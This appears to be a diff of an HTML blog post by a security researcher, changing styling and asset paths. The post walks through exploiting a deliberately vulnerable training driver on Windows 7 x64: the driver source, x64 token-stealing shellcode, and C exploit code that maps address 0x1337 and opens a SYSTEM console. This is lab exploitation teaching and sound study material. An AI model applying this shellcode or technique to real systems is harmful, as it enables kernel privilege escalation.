@@ -7,13 +7,13 @@
   	<meta name="description" content="Passionate security researcher.">
   	<meta name="author" content="Dimitri Fourny">
 	
-	<link href="/css/bootstrap.min.css" rel="stylesheet">
-    <link href="/css/style.css" rel="stylesheet">
-  	<link href="/css/syntax.css" rel="stylesheet">
+	<link href="/assets/css/bootstrap.min.css" rel="stylesheet">
+    <link href="/assets/css/style.css" rel="stylesheet">
+  	<link href="/assets/css/syntax.css" rel="stylesheet">
 
     <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
     <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  	<link rel="shortcut icon" href="/img/favicon.png">
+  	<link rel="shortcut icon" href="/assets/img/favicon.png">
 </head>
 
 <body>
@@ -31,10 +31,9 @@
 		    <div class="navbar-collapse collapse" id="navbar-main">
 		      <ul class="nav navbar-nav navbar-right">
                 <li class="active"><a href="/">Home</a></li>
-                <li><a href="https://github.com/DimitriFourny">GitHub</a></li>
 		        <li><a href="https://twitter.com/DimitriFourny">Twitter</a></li>
+                <li><a href="https://github.com/DimitriFourny">GitHub</a></li>
 		        <li><a href="http://fr.linkedin.com/pub/dimitri-fourny/58/283/13a/">Linkedin</a></li>
-		        <li><a href="/feed.xml">RSS</a></li>
 		      </ul>
 		    </div>
 		</div>
@@ -44,13 +43,15 @@
 		
 		<div class="row">
 			<div class="col-sm-12">
-				<h1 id="driver-dereferenced-pointer-in-windows-7-x64">Driver dereferenced pointer in Windows 7 x64</h1>
-
+                <h1 id="driver-dereferenced-pointer-in-windows-7-x64">Driver dereferenced pointer in Windows 7 x64</h1>
 <h2 id="introduction">Introduction</h2>
 
-<p>In my <a href="http://www.dimitrifourny.com/2014/02/26/kernel-buffer-overflow-windows/">previous article</a>, I have talked about the exploitation of kernel buffer overflow. This time, I will not play with Windows XP x86 but with Windows 7 x64 on the <a href="https://twitter.com/0vercl0k">0vercl0k’s</a> <a href="https://github.com/0vercl0k/Windows-Kernel-Flaws/tree/master/2">level 2</a> driver. 0vercl0k have coded this driver for a x86 environment, so we need to do some changes:</p>
+<p>In my previous article, I have talked about the exploitation of kernel buffer 
+overflow. This time, I will not play with Windows XP x86 but with Windows 7 x64 
+on the 0vercl0k’s level 2 driver. 0vercl0k have coded this driver for a x86 
+environment, so we need to do some changes:</p>
 
-<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;Ntifs.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Ntifs.h&gt;
 #include &lt;string.h&gt;
 </span>
 <span class="cp">#define ERROR(_f_, _status_) DbgPrint("\r\n[!] Error at %s() : 0x%x\r\n", _f_, _status_)
@@ -78,16 +79,16 @@
 
 <span class="k">typedef</span> <span class="n">VOID</span> <span class="p">(</span><span class="o">*</span><span class="n">OPERATION_F</span><span class="p">)(</span><span class="n">PFORCE4</span><span class="p">);</span>
 
-<span class="c1">//
-</span><span class="n">DRIVER_UNLOAD</span> <span class="n">Unload</span><span class="p">;</span>
+<span class="c1">//</span>
+<span class="n">DRIVER_UNLOAD</span> <span class="n">Unload</span><span class="p">;</span>
 <span class="n">DRIVER_INITIALIZE</span> <span class="n">DriverEntry</span><span class="p">;</span>
 <span class="n">DRIVER_DISPATCH</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
 <span class="n">DRIVER_DISPATCH</span> <span class="n">handleIRP</span><span class="p">;</span>
 <span class="n">VOID</span> <span class="n">ChangeLab</span><span class="p">(</span><span class="n">PFORCE4</span> <span class="n">pBeer</span><span class="p">);</span>
 <span class="n">VOID</span> <span class="n">IncreaseAlcoholPerc</span><span class="p">(</span><span class="n">PFORCE4</span> <span class="n">pBeer</span><span class="p">);</span>
 <span class="n">VOID</span> <span class="n">DecreaseAlcoholPerc</span><span class="p">(</span><span class="n">PFORCE4</span> <span class="n">pBeer</span><span class="p">);</span>
-<span class="c1">//
-</span>
+<span class="c1">//</span>
+
 <span class="n">NTSTATUS</span> <span class="nf">DriverEntry</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">pDriverObj</span> <span class="p">,</span> <span class="n">PUNICODE_STRING</span> <span class="n">pRegistryPath</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
@@ -206,19 +207,28 @@
 <span class="p">{</span>
     <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Unloading.. ]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
     <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span></code></pre></figure>
+<span class="p">}</span>
+</code></pre></div></div>
 
-<p>It is easy to find the bug: <code>op(pForce4);</code> execute a function assigned in <code>switch(pForce4-&gt;op)</code>, but if <code>pForce4-&gt;op</code> is &gt; 2, <strong>op</strong> will keep its default value <code>OPERATION_F op = EL8 = 0x1337</code> and your driver <strong>will execute the function at address 0x1337</strong>.</p>
+<p>It’s easy to find the bug: <code class="highlighter-rouge">op(pForce4)</code> executes a function assigned in 
+<code class="highlighter-rouge">switch(pForce4-&gt;op)</code>, but if <code class="highlighter-rouge">pForce4-&gt;op</code> is superior to 2, <code class="highlighter-rouge">op</code> will keep its 
+default value <code class="highlighter-rouge">OPERATION_F op = EL8 = 0x1337</code> and your driver will execute the 
+function at address <em>0x1337</em>.</p>
 
 <h2 id="exploitation">Exploitation</h2>
 
-<p>To exploit this, we need to allocate the <strong>0x1337</strong> address and put your shellcode in this place. <code>VirtualAlloc()</code> will not work because this function fail if your <em>lpAddress</em> is too small. Therefore, we will use <code>NtAllocateVirtualMemory</code> to allocate this part of memory.</p>
+<p>To exploit this, we need to allocate the <em>0x1337</em> address and put your shellcode 
+in this place. <code class="highlighter-rouge">VirtualAlloc()</code> will not work because this function fails if 
+your <code class="highlighter-rouge">lpAddress</code> is too small. Therefore, we will use <code class="highlighter-rouge">NtAllocateVirtualMemory</code> 
+to allocate this part of memory.</p>
 
 <h2 id="shellcode">Shellcode</h2>
 
-<p>We will copy, like in my previous article, the token of your SYSTEM process in your process. <strong>Do not forget to save and restore the registers in your shellcode</strong>, or you will lose some hours to find the bug… I have used FASM syntax:</p>
+<p>We will copy, like in my previous article, the token of your SYSTEM process in 
+our process. Do not forget to save and restore the registers in your shellcode 
+or you will lose some hours to find the bug… I have used FASM syntax:</p>
 
-<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">format</span> <span class="n">PE64</span> <span class="n">GUI</span> <span class="mi">4</span><span class="p">.</span><span class="mi">0</span>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">format</span> <span class="n">PE64</span> <span class="n">GUI</span> <span class="mi">4</span><span class="p">.</span><span class="mi">0</span>
 
 <span class="n">start</span><span class="o">:</span>
 
@@ -239,24 +249,24 @@
 <span class="k">push</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
 <span class="k">push</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
 
-<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="err">[</span><span class="n">gs</span><span class="o">:</span><span class="n">qword</span> <span class="mh">0x188</span><span class="err">]</span>		<span class="c">; +0x180 PrcbData : _KPRCB | +0x008 CurrentThread : _KTHREAD			</span>
-<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="err">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x70</span><span class="err">]</span>	<span class="c">; +0x050 ApcState : _KAPC_STATE | +0x020 Process : _KPROCESS</span>
-<span class="k">add</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x188</span> 			<span class="c">; +0x188 ActiveProcessLinks : _LIST_ENTRY</span>
-<span class="k">mov</span> <span class="n">rbx</span><span class="p">,</span> <span class="n">rdx</span> 			<span class="c">; Our linked list \o/ We save the first structure</span>
+<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="err">[</span><span class="n">gs</span><span class="o">:</span><span class="n">qword</span> <span class="mh">0x188</span><span class="err">]</span>   <span class="c">; +0x180 PrcbData : _KPRCB | +0x008 CurrentThread : _KTHREAD			</span>
+<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="err">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x70</span><span class="err">]</span>       <span class="c">; +0x050 ApcState : _KAPC_STATE | +0x020 Process : _KPROCESS</span>
+<span class="k">add</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x188</span>              <span class="c">; +0x188 ActiveProcessLinks : _LIST_ENTRY</span>
+<span class="k">mov</span> <span class="n">rbx</span><span class="p">,</span> <span class="n">rdx</span>                <span class="c">; Our linked list \o/ We save the first structure</span>
 
 <span class="n">searchProcess</span><span class="o">:</span>
-<span class="k">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="err">[</span><span class="n">rdx</span> <span class="o">-</span> <span class="mh">0x8</span><span class="err">]</span> 	<span class="c">; +0x180 UniqueProcessId</span>
-<span class="k">cmp</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x4</span> <span class="c">; SYSTEM PID</span>
+<span class="k">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="err">[</span><span class="n">rdx</span> <span class="o">-</span> <span class="mh">0x8</span><span class="err">]</span>        <span class="c">; +0x180 UniqueProcessId</span>
+<span class="k">cmp</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x4</span>                <span class="c">; SYSTEM PID</span>
 <span class="k">je</span> <span class="n">sysProcFound</span>
 <span class="k">mov</span> <span class="n">rcx</span><span class="p">,</span> <span class="mh">0x4141414141414141</span> <span class="c">; Our exploit PID</span>
-<span class="k">cmp</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rcx</span>				<span class="c">; cmp reg64, imm64 don't exist</span>
+<span class="k">cmp</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rcx</span>                <span class="c">; cmp reg64, imm64 don't exist</span>
 <span class="k">je</span> <span class="n">exploitProcFound</span>
  
 <span class="n">nextProcess</span><span class="o">:</span>
-<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[rdx]</span> <span class="c">; Next process (Flink)</span>
-<span class="k">cmp</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">rbx</span> <span class="c">; We are back at the starting point</span>
+<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[rdx]</span>              <span class="c">; Next process (Flink)</span>
+<span class="k">cmp</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">rbx</span>                <span class="c">; We are back at the starting point</span>
 <span class="k">je</span> <span class="n">retApp</span>
-<span class="k">jmp</span> <span class="n">searchProcess</span> <span class="c">; We loop !</span>
+<span class="k">jmp</span> <span class="n">searchProcess</span>           <span class="c">; We loop!</span>
  
 <span class="n">sysProcFound</span><span class="o">:</span>
 <span class="k">mov</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">rdx</span>
@@ -271,10 +281,11 @@
 <span class="k">je</span> <span class="n">nextProcess</span>
 <span class="k">cmp</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">rcx</span>
 <span class="k">je</span> <span class="n">nextProcess</span>
-<span class="c">; ; We copy the SYSTEM token</span>
- <span class="k">pop</span> <span class="n">rdi</span> <span class="c">; Exploit</span>
- <span class="k">pop</span> <span class="n">rsi</span> <span class="c">; System</span>
-<span class="k">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="err">[</span><span class="n">rsi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="err">]</span> <span class="c">; 0x208 - 0x188 = 0x80 | +0x208 Token : _EX_FAST_REF</span>
+
+<span class="c">; We copy the SYSTEM token</span>
+<span class="k">pop</span> <span class="n">rdi</span> <span class="c">; Exploit</span>
+<span class="k">pop</span> <span class="n">rsi</span> <span class="c">; System</span>
+<span class="k">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="err">[</span><span class="n">rsi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="err">]</span>       <span class="c">; 0x208 - 0x188 = 0x80 | +0x208 Token : _EX_FAST_REF</span>
 <span class="k">mov</span> <span class="err">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="err">]</span><span class="p">,</span> <span class="n">rax</span>
  
 <span class="n">retApp</span><span class="o">:</span>
@@ -284,13 +295,16 @@
 <span class="k">pop</span> <span class="n">rdx</span>
 <span class="k">pop</span> <span class="n">rcx</span>
 <span class="k">pop</span> <span class="n">rbx</span>
-<span class="k">ret</span></code></pre></figure>
+<span class="k">ret</span>
+</code></pre></div></div>
 
-<p><strong>Note:</strong> if you use FASM too, don’t do <code>mov rdx, [gs:0x188]</code> but <code>mov rdx, [gs:qword 0x188]</code>, because FASM compiler will make you a wtf compilation and you will lose (again) some hours to debug it.</p>
+<p>Note: if you use FASM too, don’t do <code class="highlighter-rouge">mov rdx, [gs:0x188]</code> but 
+<code class="highlighter-rouge">mov rdx, [gs:qword 0x188]</code>, because FASM compiler will make you a wtf 
+compilation and you will lose (again) some hours to debug it.</p>
 
 <h2 id="final-exploit">Final exploit</h2>
 
-<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">E:\&gt;exploit.exe
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>E:\&gt;exploit.exe
 [+] Search ntdll.dll...
 [+] Search NtAllocateVirtualMemory...
 [+] Search NtFreeVirtualMemory...
@@ -299,9 +313,10 @@
 [+] Sending force4 structure...
 [+] Free the shellcode space...
 [+] New username: SystÞme
-[+] Executing a new command console to test it...</code></pre></figure>
+[+] Executing a new command console to test it...
+</code></pre></div></div>
 
-<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;windows.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
 #include &lt;winioctl.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -364,8 +379,8 @@
 
     <span class="n">strcpy</span><span class="p">(</span><span class="n">force4</span><span class="p">.</span><span class="n">label</span><span class="p">,</span> <span class="s">"Ninja!"</span><span class="p">);</span>
     <span class="n">force4</span><span class="p">.</span><span class="n">alcohol_percentage</span> <span class="o">=</span> <span class="mi">137</span><span class="p">;</span>
-    <span class="n">force4</span><span class="p">.</span><span class="n">op</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span> <span class="c1">// op &gt; 2
-</span>
+    <span class="n">force4</span><span class="p">.</span><span class="n">op</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span> <span class="c1">// op &gt; 2</span>
+
     <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Search ntdll.dll...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
     <span class="n">dwNtdll</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">);</span>
     <span class="k">if</span><span class="p">(</span><span class="n">dwNtdll</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
@@ -395,8 +410,8 @@
     <span class="p">}</span>
      
     <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Copy the shellcode...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="n">GetCurrentProcessId</span><span class="p">());</span> <span class="c1">// Process PID
-</span>    <span class="n">memcpy</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="n">GetCurrentProcessId</span><span class="p">());</span> <span class="c1">// Process PID</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
      
      
     <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
@@ -420,8 +435,8 @@
     <span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"cmd.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
      
     <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
-<span class="p">}</span></code></pre></figure>
-
+<span class="p">}</span>
+</code></pre></div></div>
 
 			</div>
 		</div>
